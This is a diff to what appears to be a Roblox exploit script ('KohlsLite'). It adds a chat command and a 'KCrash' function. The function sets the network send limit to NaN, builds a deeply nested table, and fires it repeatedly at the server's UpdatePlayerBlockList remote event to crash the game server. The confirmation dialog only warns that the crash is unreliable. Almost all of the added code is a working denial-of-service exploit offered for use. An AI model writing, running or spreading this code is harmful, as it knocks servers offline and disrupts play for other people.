@@ -4192,6 +4192,29 @@ Commands required: shield]])
         end
     end
 
+    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'kcrash' then -- From tech-187!
+	if skipwarncrash then
+		KCrash()
+		Remind("Attempting to crash the server.")
+	else
+		local response = Instance.new("BindableFunction")
+		function response.OnInvoke(answer)
+			if answer == "Yes" then
+		    		KCrash()
+				Remind("Attempting to crash the server.")
+			end
+		end
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "KohlsLite Manager",
+			Text = "Are you sure about this? This is unreliable",
+			Duration = math.huge,
+			Callback = response,
+			Button1 = "Yes",
+			Button2 = "No"
+		})
+	end
+    end
+
    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'swc' then
 			skipwarncrash = true
 			Remind("Warning for crashing disabled.")
@@ -11659,6 +11682,52 @@ function SCrash()
           Chat("clone all all all			discord")
       end
       PtSH()
+end
+
+-- KCrash by Tech-187
+function KCrash()
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0/0)
+                    local function getmaxvalue(val)
+                        local mainvalueifonetable = 499999
+                        if type(val) ~= "number" then
+                            return nil
+                        end
+                        local calculateperfectval = (mainvalueifonetable / (val + 2))
+                        return calculateperfectval
+                    end
+
+                    local function bomb(tableincrease, tries)
+                        local maintable = {}
+                        local spammedtable = {}
+
+                        table.insert(spammedtable, {})
+                        z = spammedtable[1]
+
+                        for i = 1, tableincrease do
+                            local tableins = {}
+                            table.insert(z, tableins)
+                            z = tableins
+                        end
+
+                        local calculatemax = getmaxvalue(tableincrease)
+                        local maximum
+
+                        if calculatemax then
+                            maximum = calculatemax
+                        else
+                            maximum = 10000
+                        end
+
+                        for i = 1, maximum do
+                            table.insert(maintable, spammedtable)
+                        end
+
+                        for i = 1, tries do
+                            game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
+                        end
+                    end
+
+                    bomb(250, 2)
 end
 
 rkicking = false
